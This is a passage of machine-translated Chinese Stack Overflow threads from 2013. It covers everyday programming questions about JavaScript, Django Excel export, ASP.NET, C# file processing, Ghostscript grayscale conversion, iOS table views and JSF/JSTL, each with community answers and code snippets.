    labelDisabledClass:'jcf-label-disabled',
    classPrefix: 'jcf-class-',
    hiddenClass:'jcf-hidden',
    focusClass:'jcf-focus',
    wrapperTag: 'div'
}, 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2015-02-19T09:51:43.023

在此处查看最新版本的演示：http: [//psd2html.com/jcf](http://www.psd2html.com/js-custom-forms/)

以及 github 上的最新文档：[https ://github.com/w3co/jcf](https://github.com/w3co/jcf)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-24T20:37:27.713

它是由服务 psd2html.com 编写的用于样式化表单元素的库

# javascript - 在 HTML5 中使用 JavaScript 移动元素

> ID：15973500
> 
> 赞同：0
> 
> 时间：2013-04-12T14:08:13.050
> 
> 标签：javascript, html, drag-and-drop

我正在编写一个 Web 应用程序，用户可以通过用鼠标在 div 元素内拖动图像来平移地图。不幸的是，我需要它是跨浏览器的，以支持 IE 6-9、Firefox、Chrome 和 Safari。而且我被困在一个框架中，这个框架限制了我可以用 javascript 做什么，所以越简单越好。下面的代码（惊人地）有效，直到我添加了“！DOCTYPE html”。有什么错误？你将如何调试这个？

```
<!DOCTYPE html>
<html><head></head><body>
<style>
p{ width: 400px; background-color: gold;}
#caption {text-align: center; font-weight: bold;}
div div {
width:400px; height: 140px; 
border: 1px solid green;
background-color: lightgreen;
display: block;
position: relative;
}
div div:hover {border-color: red;}
div > .img {
  width: 200px; height: 100px; top: 10px; left: 20px;
  position: absolute;
  border: 2px solid black;
  background-image: url('http://boallen.com/assets/images/randbitmap_true.png');
}
div > .img:hover {cursor: pointer; background-color: lightgray;}
</style>

<div>
<div>p
  <span class="img" id="friend">bad ie</span>
</div>
<div id="thediv">Mouse in here and click<br></div>
</div>

<script>
var el   = document.getElementById("thediv");
var img = document.getElementById('friend');

img.onmousedown = function (event) {
  img.moving=true;
  img.mouseX=(window.event ? window.event.x: event.clientX) - img.offsetLeft;
  img.mouseY=(window.event ? window.event.y: event.clientY) - img.offsetTop;
  el.innerHTML += 'Mouse DOWN ';
}
img.onmousemove = function (event) {
  if(!img.moving) return;
  img.style.left=(window.event ? window.event.x: event.clientX) - img.mouseX;
  img.style.top=(window.event ? window.event.y: event.clientY) - img.mouseY;
  stat.innerHTML += "M-M ";
}
img.onmouseup = function (event) {
  this.moving = false;
  el.innerHTML += 'Mouse released ';
}
</script>
</body>
</html> 
```

（在 IE9、Firefox 和 Chrome 上使用[http://htmledit.squarefree.com/测试）](http://htmledit.squarefree.com/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:09:51.967

一般来说，对于调试，请使用调试器/dom 检查器逐步完成它。查看正在应用的 CSS。看看哪些 CSS 规则赢得了级联。查看哪些 CSS 规则被删除为无效。

`left`和`top`属性接受长度而不是数字。您没有在值上放置任何单位。

（在 quirks 模式下，一些浏览器认为这`99`意味着*99 像素*，但它没有任何意义）。

# django - Django：将对象从数据库导出到excel

> ID：15973505
> 
> 赞同：2
> 
> 时间：2013-04-12T14:08:30.550
> 
> 标签：django, excel

我的模板中有这个：

```
<table>
<tr><td>book_id</td><td>book name</td><td>book_author</td></tr>
{% for book in books %}
<tr><td>{{ book.book_id }}</td><td>{{ book.book_name }}</td><td>{{ book.book_author }}</td></tr>
{% endfor %}
</table>
<a href="/export">Export to Excel !</a> 
```

我的观点似乎是这样的：

```
def export_excel(request):
    books = Book.objects.all()
    response = HttpResponse(books , content_type='application/vnd.ms-excel;charset=utf-8')
    response['Content-Disposition'] = 'attachment; filename="books.xls"'
    return response 
```

这里是 mu url `urls.py`：

```
url(r'^export$', 'export_excel', name='export_excel'), 
```

它将书籍导出到名为 books.xls 的文件中，这里的问题是它在第一个正方形（A1）中将它们导出为“书籍对象”

如果我想将每个“book_attribute”放在单独的正方形中，并将每个“book”放在单独的行中，我该怎么办？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-12T14:20:58.560

您正在发送一个名为“books.xls”的东西，并正确地表明它是一个 Excel 电子表格……但事实并非如此。您完全错过了实际创建包含数据的 Excel 电子表格的步骤（这可能是这里工作的 80%）。

尝试在网上搜索如何在 Python 中创建 Excel 电子表格。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-08-26T07:41:53.987

**使用 tablib 的工作示例，这是一个出色的表格数据集库。**

```
 from django.http import HttpResponse
    import tablib

            headers = ('Book', 'Author')
            data = []
            data = tablib.Dataset(*data, headers=headers)
            books = Book.objects.all()
            for book in books:
                data.append((book.book_name, book.author))
            response = HttpResponse(data.xls, content_type='application/vnd.ms-excel;charset=utf-8')
            response['Content-Disposition'] = "attachment; filename=export.xls"

        return response 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:16:48.493

我认为问题在于您只需将 Book 对象列表传递给您的导出文件。

```
books = Book.objects.all() 
```

这一行只返回一个对象列表。

我认为您可能想要迭代 Book 对象的每个属性。将每个 Book Object 替换为显示所有字段的元组。困难的方法是做类似 books_list = map(lambda x: (x.book_id, x.book_name, ....all the field of Book), books)

并且您将 books_list 传递给导出文件而不是书籍。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-12T14:37:48.667

```
def export_excel(request):
    books = Book.objects.all()
    response = HttpResponse(books , content_type='application/vnd.ms-excel;charset=utf-8')
    response['Content-Disposition'] = 'attachment; filename="books.xls"'

    writer = csv.writer(response)
    writer.writerow(['Book', 'Author'])
    for book in books:
        writer.writerow([book.book_name, book.author])

    return response 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-02-16T10:39:09.710

使用我的插件的解决方案：[django_excel](http://django-excel.readthedocs.org/en/latest/#handle-data-export)

```
import djang_excel as excel
import pyexcel.ext.xls # in order to handle 'xls' format
# import pyexcel.ext.xlsx # in order to handle 'xlsx' format
# import pyexcel.ext.ods # in order to handle 'ods' format

def export_excel(self, request):
    # Book as django model, 'xls' as file format
    response = excel.make_response_from_a_table(Book, 'xls')
    response['Content-Disposition'] = 'attachment; filename="books.xls"' 
    return response 
```

# javascript - 用于 ASP.NET RadioButtonGroup 的 Javascript 或 JQuery

> ID：15973506
> 
> 赞同：0
> 
> 时间：2013-04-12T14:08:31.787
> 
> 标签：javascript, jquery, asp.net

我只需要从客户端的单选按钮组中获取选定的索引。但是，我对 Javascript/JQuery 真的很陌生，并且遇到了一些看起来很奇怪的行为。我在同一张表中有一个下拉列表和一个单选按钮组。在我的脚本中，我有以下内容：

```
var ddlStatuses = $find("<%= ddlStatuses.ClientID %>");
var rbgAssetClass = $find("<%= rbgAssetClass.ClientID %>"); 
```

第一个 $find 按我的预期工作，但第二个返回 null。

所以两个问题。找到我的单选按钮组并获取其选定索引的最佳方法是什么，为什么 $find 在同一个表中找到这些控件之一而不是另一个？

谢谢

编辑显示aspx：

```
 <asp:Panel ID="pnlSelectRoom" CssClass="pnlSelectRoom" runat="server" Width="930px">
        <asp:Table ID="Table1" runat="server" class="tblSelectRoomLayout" Width="100%">
            <asp:TableRow>
                <asp:TableCell>
                    <asp:Label ID="Label6" runat="server" Text="Data Center" Font-Size="Small" </asp:Label>
                </asp:TableCell>
                <asp:TableCell>
                    <asp:DropDownList Width="225px" ID="ddlDataCenter" runat="server" onchange="PopulateRooms(this);"
                        ZIndex="9001" Font-Size="Small" DataValueField="Id" DataTextField="Name" >
                    </asp:DropDownList>
                </asp:TableCell>
                <asp:TableCell>
                    <asp:Label ID="Label7" runat="server" Text="Room" Font-Size="Small"></asp:Label>
                </asp:TableCell>
                <asp:TableCell>
                    <asp:DropDownList Width="225px" ID="ddlRooms" runat="server"  ZIndex="9001" Enabled ="false">
                    </asp:DropDownList>
                </asp:TableCell>
                <asp:TableCell>
                    <asp:Label ID="Label8" runat="server" Text="Asset Status"></asp:Label>
                </asp:TableCell>
                <asp:TableCell>
                    <telerik:RadComboBox Width="225px" runat="server" ID="ddlStatuses" DataValueField="ID"
                        DataTextField="Text" CheckBoxes="true" EnableCheckAllItemsCheckBox="True" ZIndex="9001" CausesValidation="false">
                    </telerik:RadComboBox>                        
                </asp:TableCell>
            </asp:TableRow>
            <asp:TableRow Width="100%">
                <asp:TableCell ColumnSpan="6" HorizontalAlign="Center">
                    <asp:RadioButtonList CssClass="checkBoxAlign" ID="rbgAssetClass" runat="server" AutoPostBack="false"
                        RepeatDirection="Horizontal"
                        Font-Size="Small">
                        <asp:ListItem Selected="True">Base Assets&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</asp:ListItem>
                        <asp:ListItem>Contained Assets&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</asp:ListItem>
                        <asp:ListItem>SubContained Assets</asp:ListItem>
                        <asp:ListItem>All Assets&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</asp:ListItem>
                    </asp:RadioButtonList>
                </asp:TableCell>
            </asp:TableRow>
        </asp:Table>
    </asp:Panel> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:38:47.073

请注意，HTML 中没有 RadioButtonList，因此当您编写时，`$find("<%= rbgAssetClass.ClientID %>");`您可能无法得到您期望的结果。检查生成的 HTML 以查看您想要查找哪个 ID 或添加更多关于您想要完成的内容的信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:11:00.780

你可以像下面那样做。

**在 JavaScript 中，控件在哪里或内容页或母版页都无关紧要**

```
<asp:CheckBoxList ID="chkModuleList"runat="server" />

<asp:CustomValidator runat="server" ID="cvmodulelist"
  ClientValidationFunction="ValidateModuleList"
  ErrorMessage="Please Select Atleast one Module" />

// javascript to add to your aspx page
function ValidateModuleList(source, args)
{
  var chkListModules= document.getElementById ('<%= chkModuleList.ClientID %>');
  var chkListinputs = chkListModules.getElementsByTagName("input");
  for (var i=0;i<chkListinputs .length;i++)
  {
    if (chkListinputs [i].checked)
    {
      args.IsValid = true;
      return;
    }
  }
  args.IsValid = false;
} 
```

**更新：** 或者你可以通过这种方法：把任何`css-class`说`company`。你可以通过下面。

您可以使用 (http://api.jquery.com/checked-selector/)选择`:checked`器[：](http://api.jquery.com/checked-selector/)

```
<script>
    $(document).ready(function() {
        $(".company input").click(function() {
            var cnt = $(".company input:checked").length;
            if (cnt == 0)
            {
               // none checked
            }
            else
            {
               // any checked
            }
        });
    });
</script> 
```

**您可能希望在这些复选框的容器上添加（或使用）一个 id，以优化选择器速度。**

至于 asp.net 在控件上弄乱客户端 ID，您可以使用

```
$('<%= MyControl.ClientID %>') 
```

参考：

*   [检查是否在客户端的一组复选框中选中了一个复选框](https://stackoverflow.com/questions/5529319/check-if-a-checkbox-is-checked-in-a-group-of-checkboxes-in-clientside)
*   [如何验证用户至少选择了一个复选框？](https://stackoverflow.com/questions/1146234/asp-net-checkboxlist-how-to-validate-a-user-choose-at-least-one-checkbox)

# c# - 在整个文件系统中搜索和替换文件内容的提示

> ID：15973509
> 
> 赞同：0
> 
> 时间：2013-04-12T14:08:33.947
> 
> 标签：c#, .net, file, stream

我负责开发一个在生产服务器上运行的应用程序，它旨在搜索和替换每个 ini、xml 和配置文件扩展名中的一些特定字符串，我必须关心性能（总共 150 台服务器）。在替换之前，我必须备份文件。实现这一目标的最佳方法是什么？顺便说一句，我可以使用 Dot Net 4.0，但最好使用 3.5，因为不是每个服务器都有 4.0，但如果有很大的优势，我可以更新到 4.0。现在我在想这样的事情：

```
String[] arrayFiles = Directory.GetFiles(strFylesystem , strExtensao, SearchOption.AllDirectories);
        foreach (string s in arrayFiles ){
            File.Copy(pathOrigin + s, pathNew);
            searchFound = false;
            foreach (string line in File.ReadAllLines(pathNew + s){
                if (line.contains("string_searched")){
                    line.Replace("string_searched", new_string);
                    searchFound = true;
                }
                if (!searchFound){
                    File.Delete(pathNew + s);
                }
            }
        } 
```

我发现一些论坛使用 Lambda、PLINQ e 正则表达式。除了个人喜好之外，这些对我的表现有帮助吗？例如：如果不是使用`File.ReadAllLines`我开发使用，性能会更好`StreamReader`吗？有没有办法包装`findStr`从窗口并获得性能改进？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T15:17:46.210

您的限制因素将是磁盘访问速度，而您无法加快速度。当然，使用 Lambda 表达式不会产生性能差异。

除非您有多个驱动器，否则并行搜索将无济于事。也就是说，让两个线程在同一个驱动器上的不同目录上工作可能会减慢速度，因为它们会争用磁盘访问。

一个潜在的问题是您在枚举驱动器上的所有文件时在驱动器上创建新文件。如果你不小心，你可能会陷入无限循环。也就是说，您读取 x.xml，创建一个新文件 x.new.xml，然后找到 x.new.xml，更改它等等。您最好扫描整个驱动器并构建一个列表要更改的文件。然后浏览该列表，进行更改。

我建议您不要使用 C# 执行此操作。相反，编写两个 PowerShell 脚本。第一个在驱动器中搜索与您的条件匹配的文件，并将这些文件名写入文件。第二个从该文件中读取文件名，并处理这些文件。有关示例，请参见[https://stackoverflow.com/a/60065/56778 。](https://stackoverflow.com/a/60065/56778)

这可能不会像 C# 程序那么快，但我怀疑它会慢很多。同样，您的限制因素是磁盘访问速度，而不是处理速度。您的开发时间将是几个小时而不是几天。而且修改 PowerShell 脚本比修改 C# 程序更容易。

# class - 编辑和保存类库后导致错误 1309 的原因是什么？

> ID：15973511
> 
> 赞同：0
> 
> 时间：2013-04-12T14:08:44.497
> 
> 标签：class, class-library, visual-foxpro

我在 Visual FoxPro（.vcx 文件）中有一个类库。在我编辑其中包含的代码，然后运行我的应用程序后，我收到错误 1309“[类库名称] 不是目标文件”。

这是在类被实例化之后，并且发生在 .vcx 中的类调用自身内部的方法时。所以此时它确实是一个对象，因为导致错误的代码行包含在类库中。

我注意到，每当我编辑和保存 .vcx 时，如果我将 .vcx 作为表格打开，我可以看到有两个与生成错误的类有关的已删除行。如果我打包 .vcx 并运行程序，我不会收到任何错误。同样，如果我编译 CLASSLIB [类库名称]，我不会收到任何错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T15:10:58.103

VCX是否可能已损坏？您可以尝试执行“另存为”并再次测试 VCX 吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T20:12:00.750

您可以尝试重新编译类库。类库既有代码列（作为原始文本），又有另一列中的 OBJECT COMPILED 代码。它可能很简单

编译类（yourClassLibrary）

这将为类库中的所有记录重建 objcode 列。

如果文件的 .vct（.fpt 备忘录部分）损坏，那么您将处于更难恢复的位置。

# php - 将特殊符号转换为相应的 Html 实体编号

> ID：15973516
> 
> 赞同：0
> 
> 时间：2013-04-12T14:08:54.177
> 
> 标签：php, xml, xsl-fo

我需要`(®¢)`使用 PHP 将特殊字符转换为相应的 HTML 实体编号。有没有类似`htmlentities()`实现这个功能的功能？我们需要在`xsl:fo`文档中填充特殊符号。最好的方法是将特殊字符存储为实体编号。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:26:32.897

看看[mb_encode_numericentity](http://www.php.net/manual/en/function.mb-encode-numericentity.php)。

```
mb_encode_numericentity ($string, array (0x0, 0xffff, 0, 0xffff), 'UTF-8') 
```

这会将整个字符串转换为数字实体。您可以通过将第二个参数的成员修改为 来更改将要转换的字符范围`mb_encode_numericentity`。

# javascript - 单击页面上的任何位置时，我希望我的 div 向上滑动

> ID：15973517
> 
> 赞同：-3
> 
> 时间：2013-04-12T14:08:54.240
> 
> 标签：javascript, jquery, slidetoggle

```
$(".slidingDiv").hide();
$(".show_hide").show();
$('.show_hide').click(function(){
    $(".slidingDiv").slideToggle();
}); 
```

我想在页面上的任何位置单击它外部时向上滑动我的 div。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:14:05.077

```
$('body').not('.slidingDiv').click(function(){
    $('.slidingDiv').slideUp();
}); 
```

应该做的伎俩。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:15:47.603

也许这会起作用：

```
$(document).click(function() {
    if($('.slidingDiv:hover').length===0) $('.slidingDiv').slideUp();
}); 
```

# java - 在eclipse中读取HDFS文件

> ID：15973518
> 
> 赞同：0
> 
> 时间：2013-04-12T14:08:55.427
> 
> 标签：java, eclipse, hadoop, hdfs

我已经在 eclipse.my 中安装了 hadoop 插件。我的 mapreduce 程序有迭代，我想在每次迭代中读取 hdfs 中的文件。我直接从hdfs读取文件还是将文件复制到本地然后读取？哪个更高效？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:22:31.287

这完全取决于你想用它做什么；如果您要重用文件内容，您不妨将其复制到本地以将重复查找保存到 HDFS，但如果您只需要读取一次，则直接从 HDFS 没有任何害处，因为复制到本地将涉及读取无论如何，它是从那里开始的。

# javascript - 计算器不适用于 javascript

> ID：15973520
> 
> 赞同：-3
> 
> 时间：2013-04-12T14:08:58.073
> 
> 标签：javascript

我搜索了互联网、图书馆和其他十几个无法提供答案的东西。这是我的 .js 文件

```
// JavaScript Document
function calculate()
{
var form = document.getElementById("calc");

var text1 = document.getElementById("calculator9").value-0;
var text2 = document.getElementById("calculator13").value-0;
var x = parseFloat(text1.value);
var y = parseFloat(text2.value);  
var out = document.getElementById("calculator21").value = "$" + ((x * y) * 0.0016) - ((x * y) * 0.00085);
} 
```

这是我在计算器页面上的表格

```
<form id="calc" name="calc" method="post" action=""> 
<div id="calculator8"> </div>
<div id="calculator9"><input type="text" name="x" class="box1" /> </div>
<div id="calculator10"> </div>
<div id="calculator11"> </div>
<div id="calculator12"> </div>
<div id="calculator13"><input type="text" name="y"  class="box2" /> </div>
<div id="calculator14"> </div>
<div id="calculator15"> </div>
<div id="calculator16"> </div>
<div id="calculator17"><input type="submit" name="submit"  class="button"   value="" onclick="calculate()" /></div>
<div id="calculator18"> </div>
<div id="calculator19"> </div>
<div id="calculator20"> </div>
<div id="calculator21"><input type="text" name="text3"  class="box3" readonly="readonly" value="" />   </div>
<div id="calculator22"> </div>
</form> 
```

任何人都可以在这里帮助我......这真的让我发疯！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:18:45.320

您在脚本中为输入字段提供了错误的 ID

```
var text1 = document.getElementById("calculator9").value; 
```

calculator9 是 div 不是输入。所以试试这个

```
<div id="calculator13"><input type="text" id="txt9" name="y"  class="box2" /> </div> 
```

并像这样使用它

```
var text1 = document.getElementById("txt9").value; 
```

您的脚本中还有其他问题，例如

```
var x = parseFloat(text1.value); 
```

这里`text1.value`未定义，仅使用`text1`

你可以在这里得到工作示例

[JS 小提琴演示](http://jsfiddle.net/Tc5QU/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:10:09.307

您没有取消提交按钮的单击操作，因此表单正在提交。

```
<form id="calc" name="calc" method="post" action="" onsubmit="return false"> 
```

其他问题

```
var text1 = document.getElementById("calculator9").value-0;  <What is with the -0
var text2 = document.getElementById("calculator13").value-0;  <9 and 13 table cells, not inputs, they have no value!
var x = parseFloat(text1.value);  <-- text1 should be a string, not a dom object
var y = parseFloat(text2.value); 
```

它应该看起来像

```
var text1 = document.getElementById("textbox1_id").value;
var text2 = document.getElementById("textbox2_id").value;
var x = parseFloat(text1);
var y = parseFloat(text2);  
.../
var out = document.getElementById("textbox3_id").value 
```

和 HTML

```
<input type="text" name="x" class="box1" id="textbox1_id"/>
<input type="text" name="y" class="box2" id="textbox2_id"/>
<input type="text" name="text3"  class="box3" readonly="readonly" value="" id="textbox3_id"/> 
```

# java - 与 GWT 类似的破解库功能

> ID：15973523
> 
> 赞同：1
> 
> 时间：2013-04-12T14:09:08.427
> 
> 标签：java, jakarta-ee, gwt

我需要测试给定密码的强度，类似于crackLib 的工作方式。确保密码不容易被猜到。

1）我怎样才能在 GWT ui 本身而不是后端进行检查

2）检查以确保密码中没有字典单词是合理的替换，如果是这样怎么做？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T18:09:57.110

这不应该在客户端完成，因为这样做的安全方法很少。无论如何，您尝试将候选人传递给浏览器中的 crackLib 的 GWT 实现会暴露它被黑客攻击或泄露密码性质。

最好的办法是通过启用 XSRF 的 RPC 发送它并通过服务器验证它。

当然，为了确保安全，到服务器的小往返是很小的代价。

# iphone - scrollsToTop 不适用于简单的 Master-Detail iOS 应用程序

> ID：15973524
> 
> 赞同：1
> 
> 时间：2013-04-12T14:09:08.397
> 
> 标签：iphone, ios, cocoa

使用 Xcode 4.6.1、iOS SDK 6.1，创建一个新的 Master-Detail iOS 应用程序（使用 ARC，没有故事板）并在 DetailViewController 中将 configureView 设置为：

```
- (void)configureView
{
    UITableView *lTableView = [[UITableView alloc] initWithFrame: self.view.frame];
    lTableView.scrollsToTop = YES;  // just to emphasise, it is the default anyway
    lTableView.dataSource = self;
    [self.view addSubview: lTableView];
} 
```

然后我通过返回 100 个虚拟 UITableViewCells 来确保 UITableView 中有足够的数据，似乎点击状态栏不会将表格视图滚动到顶部。

我在这里缺少什么明显的东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:26:31.347

`UIScrollView`如果同一窗口中的任何其他实例或子类实例也`scrollsToTop`设置为，则滚动到视图顶部将不起作用，`YES`因为 iOS 不知道如何选择应该滚动哪个。在您的情况下，`configureView`实际上被调用了两次：

*   在`viewDidLoad`加载详细控制器时
*   在`setDetailItem:`主控制器推送到细节控制器时

因为您要在 中添加 a`UITableView`作为子视图`configureView`，所以最终会得到两个表视图，均`scrollsToTop`设置为`YES`。要解决此问题，请在其中创建表视图`viewDidLoad`并仅`configureView`用于根据给定详细信息项的需要修改基本状态。

```
- (void)viewDidLoad {
    [super viewDidLoad];

    UITableView *lTableView = [[UITableView alloc] initWithFrame: self.view.frame];
    lTableView.scrollsToTop = YES;
    lTableView.dataSource = self;
    [self.view addSubview: lTableView];

    [self configureView];
} 
```

# ghostscript - 使用ghostscript一页后颜色转换错误

> ID：15973525
> 
> 赞同：1
> 
> 时间：2013-04-12T14:09:11.757
> 
> 标签：ghostscript

我正在使用 Ghostscript 9.07 使用批处理脚本将 PDF 文件从彩色转换为灰色。该脚本工作并从颜色转换为灰色，但仅适用于第一页。在我尝试过的每个 PDF（12 个 PDF）上，转换策略都会恢复为在第一页之后保持颜色不变。

脚本：

```
C:\working-environment\gs9.07\bin\gswin64c -o C:\Test\converted.pdf -sDEVICE=pdfwrite -dLastPage=20 -dColorConversionStrategy=/Gray -dProcessColorModel=/DeviceGray C:\Test\original.pdf 
```

注意：我以管理员身份在 Windows 7 PC 上运行脚本。设置 -dLastPage 参数是因为我有很长的 PDF（500 多页）。

错误：

```
Unable to convert color space to Gray. reverting strategy to LeaveColorUnchanged. 
```

注意：我使用了 Oracle 和 Postgress 手册，因为我也想查看性能。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-25T02:52:03.080

我对 Ghostscript 9.06 也有同样的问题。`pdftops -level3sep`在将文档传递给 Ghostscript 之前使用将文档转换为 CMYK 颜色为我解决了这个问题。bash 中的示例：

```
gs -o converted.pdf -sDEVICE=pdfwrite -dColorConversionStrategy=/Gray \
  -dProcessColorModel=/DeviceGray <(pdftops -level3sep input.pdf -) 
```

也试试：

```
gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dNOPAUSE -dQUIET -dBATCH \
  -dAutoRotatePages=/None -dUseCIEColor -sOutputFile=output.pdf input.pdf 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T16:50:25.410

几乎可以肯定，“后续”页面使用的颜色空间，正如消息通知您的那样，无法转换为 DeviceGray。在没有看到文件的情况下（我真的不想要一个 500 多页的文件作为例子）我不能告诉你是什么导致了你的问题。如果你可以制作一个展示这个的小文件，我会看看它。

请注意，这不是错误，而是警告。一个错误会中止工作。

Ghostscript 下一个版本中的新颜色管理应该意味着无论如何都不会再发生这种情况。

[编辑]

对我来说，无论我使用当前代码还是发布的 9.07，这个文件都会在第一页给出警告。因为色彩空间的问题出现在页面内容的后期，所以在此之前的所有内容确实都转换为灰色，但后面的内容没有。

出现此问题的原因是 PDF 文件使用 /Separation /All 颜色空间在页面上绘制“打印机标记”。当前代码无法转换 /Separation 颜色空间，也无法保留它，因此它恢复为“保持颜色不变”。因为打印机标记是页面上的最后一件事，并且因为 /All 标记了所有印版，因此看起来是黑色的，所以看起来整个页面都已转换，但事实并非如此。

通过将文件拆分为 3 个单独的页面，您将获得看起来是三个单独的“正确”页面，但实际上每个页面都已部分转换并且仍然包含 /Separation /All 中的打印机标记。

Ghostscript Git 存储库中的当前代码在设置为使用新的 CMS 方案时，会在没有警告的情况下转换此文件，并且表面上正确处理多页文件，但此代码尚不完整。它应该与 GS 9.08 一起发布。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-04-05T18:20:35.850

补充一下这里的信息：这在 GS 版本 9.10 中仍然是一个问题，可能与 EPS 文件的存在有关。解决这个问题的方法是强制它使用旧的颜色管理代码。

```
gs -sDEVICE=pdfwrite -sProcessColorModel=DeviceGray -sColorConversionStrategy=Gray \
   -dOverrideICC -dPDFUseOldCMS=false 
```

此错误报告有更多信息：[https ://bugs.ghostscript.com/show_bug.cgi?id=694608](https://bugs.ghostscript.com/show_bug.cgi?id=694608)

# javascript - 使用 javascript 创建一个类的对象

> ID：15973526
> 
> 赞同：0
> 
> 时间：2013-04-12T14:09:18.693
> 
> 标签：javascript, ajax

我有表单数据，我试图将其发布到我正在使用 ajax 的服务器，因为我将表单作为页面上的一部分。我有一个具有这些参数的类，它是服务器上 C# 中的“EditModel”类。

我如何将这些变量转换为这个模型对象，以便我可以传递数据，这个模型必须使用 javascript 创建

```
 function getFromData() {
           //alert("hell yea");
           var username = document.getElementById("Name").value;
           var pa = document.getElementById("password").value;
           var email = document.getElementById("Email").value;
           var active = document.getElementById("IsActive").value;

       } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:17:12.013

您需要创建一个 json 对象来保存发布数据，然后再将其发送出去。下面是一个使用 jQuery 进行 ajax 调用的示例：

```
var $form = $('#container').find('form'); // this will find the first form element within the element with id of container
var ajaxData = {
    'name': $form.find('#Name').val(),
    'password': $form.find('#password').val(),
    'email': $form.find('#Email').val(),
    'isActive': $form.find('#IsActive').val()
};
$.ajax({
    url: $form.attr('action'),
    type: 'POST',
    data: ajaxData,
    success: function (data, textStatus, jqXHR) {
        if (data.redirect) {
            window.location.href = data.redirect;
        } else {
            alert("Something bad happened");
        }
    }
}); 
```

您可以使服务器端的操作方法返回一些 json（通过 a `JsonResult`）并在 ajax 调用的成功方法中检查该 json 的存在。如果 json 存在，则 POST 成功，您可以适当地重定向。我在一个名为 redirect 的属性中传递了一个 URL，然后我用它来将用户重定向到成功屏幕。

# jsf - 将 items 属性视为字符串

> ID：15973529
> 
> 赞同：0
> 
> 时间：2013-04-12T14:09:20.087
> 
> 标签：jsf, glassfish, jstl, el

我正在尝试迭代一组元素，这些元素是复杂类型（另一个实体），使用`<c:forEach>`：

```
<c:forEach items="#{repcatTree.items}" var="item">
    <div style="padding-top:7px; padding-bottom:7px; padding-right:15px;">
        <span class="report_item_category_class">
            <h:commandLink rendered="#{item.type == 'category'}" action="#{item.onNodeClicked}" styleClass="default_link">
                <h:graphicImage url="/views/tree/images/folder_big.gif" />
                <h:outputText value="#{item.attributes.FILE_NAME}" style="font-size:14px; font-weight:bold; padding-left:5px" />
            </h:commandLink>
            <h:commandLink rendered="#{item.type == 'report'}" styleClass="default_link" action="action_report_run" title="#{item.cells['report_name'].toolTip}">
                <h:graphicImage url="/icon?rdd_path=#{item.attributes.RDD_PATH}" />               
                <h:outputText value="#{item.cells['report_name'].display}" style="font-size:14px; font-weight:bold; padding-left:5px" />
                <f:param name="nodePath" value="#{item.attributes.RDD_PATH}" />
                <f:param name="nodePrettyPath" value="#{item.attributes.CAT_PATH}" />
            </h:commandLink>
        </span>
    </div>
</c:forEach> 
```

但是，在 forEach 块逻辑内部将 '#{item}' 元素视为常规`java.lang.String`原因

> javax.el.PropertyNotFoundException：类'java.lang.String'没有属性'type'。

这是我的`faces-config.xml`（JSF 1.2）相关映射条目：

```
<managed-bean>
    <managed-bean-name>repcatTree</managed-bean-name>   
    <managed-bean-class>rpt.engine.runner.tree.impl.RepcatTreeModel</managed-bean-class>
    <managed-bean-scope>session</managed-bean-scope>
    <managed-property>
        <property-name>path</property-name>
        <property-class>java.lang.String</property-class>
        <value>/</value>
    </managed-property>
    <managed-property>
        <property-name>listener</property-name>
        <property-class>rpt.engine.runner.tree.listeners.ReportsTreeModelListener</property-class>
        <value>#{reportsTreeModelListener}</value>
    </managed-property>       
    <managed-property>
        <property-name>tableModel</property-name>
        <property-class>rpt.engine.runner.table.TableModel</property-class>
        <value>#{repcatTableModel}</value>
    </managed-property>
</managed-bean> 
```

这是如何引起的，我该如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:15:27.853

如果您对环境使用了错误的 JSTL 版本或使用了错误的 JSTL taglib URI 声明，就会发生这种情况。

JSF 1.2 至少意味着 Servlet 2.5（您的 webapp`web.xml`也必须这样声明！），这反过来意味着至少 JSTL 1.2，这反过来意味着 taglib URI 为`http://java.sun.com/jsp/jstl/core`.

确保你做对了一切。导致您的特定问题是因为`#{repcatTree.items}`没有被解释为 EL 表达式，而是被解释为纯字符串，这表明 JSTL 中的 EL 根本不起作用，这反过来表明您可能正在使用 JSTL 1.0/1.1（请注意 Glassfish已经捆绑了 JSTL，所以你不应该随你的 webapp 一起发布任何东西），或者使用没有`/jsp`路径的 JSTL 1.0 taglib URI，或者`web.xml`没有声明符合 Servlet 2.5。

### 也可以看看：

*   [我们的 JSTL wiki 页面](https://stackoverflow.com/tags/jstl/info)- 包含下载链接和安装说明

# c++ - 使用其他没有类名的类的枚举::

> ID：15973532
> 
> 赞同：1
> 
> 时间：2013-04-12T14:09:23.867
> 
